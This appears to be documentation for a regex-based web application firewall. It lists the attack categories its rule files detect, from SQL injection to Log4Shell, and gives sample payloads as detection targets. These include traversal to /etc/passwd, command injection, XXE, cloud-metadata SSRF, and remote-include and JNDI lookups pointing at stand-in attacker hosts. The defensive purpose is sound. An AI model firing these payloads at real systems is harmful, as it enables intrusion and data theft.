# Attack Coverage

This document summarises the attack categories addressed by the rule files shipped under [`rules/`](../rules/) and [`rules.json`](../rules.json). The coverage is regex-based; it complements, but does not replace, application-layer input validation, parameterised database queries, output encoding, and a sound authentication / authorisation design.

The categories below correspond to the bundled rule sets. Each item lists the file (or files) that exercise the category, the kind of payloads the regex patterns target, and a representative example.

---

## SQL Injection
- **Files**: [`rules/sql-injection.json`](../rules/sql-injection.json), entries in [`rules.json`](../rules.json).
- **Targets**: `ARGS`, `BODY`, `HEADERS`, `COOKIES`.
- **Patterns detect**: classic boolean tautologies, UNION-based extraction, comment-bypass tokens (`--`, `/* */`), stacked statements, time-based functions (`SLEEP`, `BENCHMARK`).
- **Example**: `id=1' OR '1'='1' --`

## Cross-Site Scripting (XSS)
- **Files**: [`rules/xss.json`](../rules/xss.json).
- **Targets**: `ARGS`, `BODY`, `HEADERS`, `COOKIES`.
- **Patterns detect**: `<script>` tags, event-handler attributes (`onerror=`, `onload=`), `javascript:` URLs, common encoded variants.
- **Example**: `<img src=x onerror=alert(1)>`

## Path Traversal / Local File Inclusion
- **Files**: [`rules/lfi.json`](../rules/lfi.json).
- **Targets**: `URI`, `ARGS`, `HEADERS`.
- **Patterns detect**: `../`, `..\\`, URL-encoded variants (`%2e%2e/`), Unicode escapes, well-known target paths (`/etc/passwd`, `/proc/self/environ`).
- **Example**: `?file=../../../../etc/passwd`

## Remote Code Execution / Command Injection
- **Files**: [`rules/rce.json`](../rules/rce.json).
- **Targets**: `ARGS`, `BODY`, `HEADERS`, `COOKIES`, `URI`.
- **Patterns detect**: shell metacharacters (`|`, `;`, `&&`, backticks), `$( … )`, common command names (`cat`, `whoami`, `nc`, `wget`, `curl`).
- **Example**: `?cmd=$(whoami)`

## Remote File Inclusion
- **Files**: [`rules/rfi.json`](../rules/rfi.json).
- **Targets**: `ARGS`, `BODY`.
- **Patterns detect**: `http://` / `https://` / `ftp://` URLs supplied as input parameters.
- **Example**: `?include=http://evil.example/shell.txt`

## Server-Side Request Forgery (SSRF)
- **Files**: [`rules/ssrf.json`](../rules/ssrf.json).
- **Targets**: `ARGS`, `BODY`, `HEADERS`.
- **Patterns detect**: `localhost`, `127.0.0.0/8`, `169.254.169.254` (cloud metadata), private CIDR space, alternate localhost schemes.
- **Example**: `?url=http://169.254.169.254/latest/meta-data/`

## XML External Entity (XXE)
- **Files**: [`rules/xxe.json`](../rules/xxe.json).
- **Targets**: `BODY`, `ARGS`.
- **Patterns detect**: `<!DOCTYPE … [ <!ENTITY` declarations, `SYSTEM` entities, parameter entities.
- **Example**: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`

## Server-Side Template Injection (SSTI)
- **Files**: [`rules/ssti.json`](../rules/ssti.json).
- **Targets**: `ARGS`, `BODY`.
- **Patterns detect**: `{{ … }}`, `${ … }`, `<%= … %>` and other template engine sigils.
- **Example**: `?name={{7*7}}`

## NoSQL Injection
- **Files**: [`rules/data-validation.json`](../rules/data-validation.json) and entries in [`rules.json`](../rules.json).
- **Targets**: `ARGS`, `BODY`.
- **Patterns detect**: MongoDB operators (`$ne`, `$gt`, `$where`), JSON operator-injection idioms.
- **Example**: `{"username": {"$ne": null}}`

## LDAP / XPath Injection
- **Files**: rules in [`rules.json`](../rules.json).
- **Targets**: `ARGS`, `BODY`.
- **Patterns detect**: `(|`, `&(`, `*)(uid=*` and similar bypass payloads.
- **Example**: `?user=*)(uid=*)`

## HTTP Request Smuggling
- **Files**: [`rules/smuggling.json`](../rules/smuggling.json).
- **Targets**: `HEADERS`.
- **Patterns detect**: conflicting `Transfer-Encoding`/`Content-Length` combinations, `Transfer-Encoding: chunked` permutations, suspicious whitespace.

## CRLF Injection / Response Splitting
- **Files**: entries in [`rules.json`](../rules.json) (`crlf-injection-headers`).
- **Targets**: `HEADERS`, `ARGS`.
- **Patterns detect**: literal `\r\n` and URL-encoded variants (`%0d%0a`).

## HTTP Parameter Pollution
- **Files**: [`rules/hpp.json`](../rules/hpp.json).
- **Targets**: `ARGS`.
- **Patterns detect**: duplicate / conflicting parameter idioms typical of HPP exploitation.

## Insecure Deserialization
- **Files**: [`rules/insecure-deserialization.json`](../rules/insecure-deserialization.json).
- **Targets**: `BODY`, `HEADERS`, `COOKIES`.
- **Patterns detect**: Java serialised object magic (`AC ED`), PHP serialised tags (`O:` / `s:`), Python pickle markers.

## CSRF / Origin Tampering
- **Files**: [`rules/csfr.json`](../rules/csfr.json).
- **Targets**: `HEADERS`.
- **Patterns detect**: missing or mismatched `Origin` / `Referer`, inconsistent CSRF tokens. (CSRF defense in depth still requires a server-side token check; the WAF rules add a second line of inspection.)

## GraphQL Introspection / Abuse
- **Files**: [`rules/graphql.json`](../rules/graphql.json).
- **Targets**: `BODY`, `URI`.
- **Patterns detect**: `__schema`, `__type`, deep nested queries.

## Authentication Abuse
- **Files**: [`rules/authentication.json`](../rules/authentication.json).
- **Targets**: `URI`, `ARGS`, `BODY`.
- **Patterns detect**: high-volume credential stuffing markers, well-known login endpoints (`wp-login.php`, `xmlrpc.php`).

## Vulnerability Exploitation (CVE-specific)
- **Files**: [`rules/vulnerability.json`](../rules/vulnerability.json), entries in [`rules.json`](../rules.json).
- **Targets**: `URI`, `BODY`, `HEADERS`.
- **Patterns detect**: known exploit signatures including Log4Shell (CVE-2021-44228) JNDI lookups.
- **Example (Log4Shell)**: `${jndi:ldap://attacker.example/a}`

## Scanner / Tooling Detection
- **Files**: entries in [`rules.json`](../rules.json) (`block-scanners`).
- **Targets**: `HEADERS:User-Agent`.
- **Patterns detect**: User-Agent strings emitted by known scanners (Nikto, sqlmap, Nmap, Nessus, OpenVAS, Burp Suite, Nuclei, …).

## SpiderLabs / Trustwave Rules
- **Files**: [`rules/spiderlabs.json`](../rules/spiderlabs.json).
- **Targets**: various.
- **Patterns detect**: a curated subset of patterns derived from the SpiderLabs / OWASP-CRS sources.

---

## Layered defence

Regex rules are necessary but not sufficient. Pair this WAF with:

- Input validation and parameterised queries in the application layer.
- Strict CORS and CSRF token handling.
- Network-level controls: TLS termination, reverse proxy with sane timeouts, observability.
- Periodic review of the bundled rule files; the threat landscape evolves and so must the rules.

See [scripts.md](scripts.md) for helpers that ingest external feeds and produce updated rule and blacklist files.
